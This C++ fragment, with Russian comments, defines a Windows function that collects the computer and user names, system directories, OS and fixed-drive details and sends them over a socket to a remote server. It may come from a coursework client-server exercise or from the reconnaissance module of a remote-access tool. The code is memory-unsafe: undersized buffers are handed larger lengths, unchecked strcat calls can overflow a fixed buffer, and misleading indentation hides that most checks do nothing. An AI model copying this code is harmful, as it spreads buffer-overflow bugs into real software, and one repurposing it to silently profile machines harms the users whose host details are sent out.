#include "Header.h"
#include <sstream>
#define BUFFER_SIZE 390
void sendInformationSysteme(struct Data *data)
{
	char buffer[BUFFER_SIZE];
	LPTSTR lpszSystemInfo;
	DWORD cchBuff = 256;
	DWORD dwResult;
	TCHAR tchBuffer[100];
	lpszSystemInfo = tchBuffer;
	strcpy(buffer, "INFORMATION\n\n");
	if (GetComputerName(lpszSystemInfo, &cchBuff))
	
		strcat(buffer, "Computer name: ");
		strcat(buffer, lpszSystemInfo);
		strcat(buffer, "\n");
			// Получаем и отображаем имя пользователя.
		
			if (GetUserName(lpszSystemInfo, &cchBuff))
		
			strcat(buffer, "User name: ");
			strcat(buffer, lpszSystemInfo);
			strcat(buffer, "\n");
			// Получаем и отображаем системную директорию.
		
			if (GetSystemDirectory(lpszSystemInfo, MAX_PATH + 1))
		
			strcat(buffer, "System directory: ");
			strcat(buffer, lpszSystemInfo);
			strcat(buffer, "\n");
			// Получаем и отображаем директорию Windows.
		
			if (GetWindowsDirectory(lpszSystemInfo, MAX_PATH + 1))
			
			strcat(buffer, "Windows directory: ");
			strcat(buffer, lpszSystemInfo);
			strcat(buffer, "\n");
		
			dwResult = ExpandEnvironmentStrings(
				"OS=%OS%",
				lpszSystemInfo,
				BUFFER_SIZE);
			if (dwResult <= BUFFER_SIZE)
			strcat(buffer, lpszSystemInfo);
			strcat(buffer, "\n");

	int sz = GetLogicalDriveStrings(NULL, 0);
	TCHAR* szLogicalDrives = new TCHAR[sz];
	GetLogicalDriveStrings(sz, szLogicalDrives);
	strcat(buffer, "MEMORY AND FLAGS\n\n");
	while (*szLogicalDrives)
	{
		TCHAR szDisk[80];
		lstrcpy(szDisk, szLogicalDrives);
		GetDriveType(szDisk);
		UINT uDriveType = GetDriveType(szDisk);
		if (uDriveType == DRIVE_FIXED)
		{
			strcat(buffer, szDisk);
			strcat(buffer, "\n");
			strcat(buffer, "systems flags:\t");
			DWORD dwSystemFlags;
			GetVolumeInformation(szDisk, NULL, 0, NULL, 0, &dwSystemFlags, NULL, 0);
			int a = dwSystemFlags;
			char str[20];
			sprintf(str, "%d", a);
			strcat(buffer, str);
			strcat(buffer, "\n");
			//определяем объем      
			__int64 uliTotalBytes;
			GetDiskFreeSpaceEx(szDisk, NULL, (PULARGE_INTEGER)&uliTotalBytes, NULL);
			strcat(buffer, "size memory in disk:\t");
			a = uliTotalBytes / (1024 * 1024);
			sprintf(str, "%d", a);
			strcat(buffer, str);
			strcat(buffer, "MB\n");
		}
		while (*szLogicalDrives) szLogicalDrives++;
		szLogicalDrives++;
	}
	send(data->Server, buffer, BUFFER_SIZE, 0);
}




